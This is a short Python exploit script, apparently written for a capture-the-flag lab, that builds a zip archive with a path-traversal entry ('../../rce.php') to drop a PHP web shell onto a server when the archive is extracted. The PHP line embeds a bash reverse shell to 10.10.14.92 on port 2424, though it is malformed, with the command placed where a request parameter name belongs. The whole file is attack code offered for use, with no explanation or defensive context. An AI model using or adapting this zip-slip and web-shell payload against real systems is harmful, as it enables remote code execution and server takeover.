#!/usr/bin/python
import zipfile
from io import StringIO

def _build_zip():
    f = StringIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    z.writestr('../../rce.php', '<?php system($_GET["/bin/bash -i >& /dev/tcp/10.10.14.92/2424 0>&1"]); ?>')
    z.close()
    zip = open('rce.zip','wb')
    zip.write(f.getvalue())
    zip.close()

_build_zip()
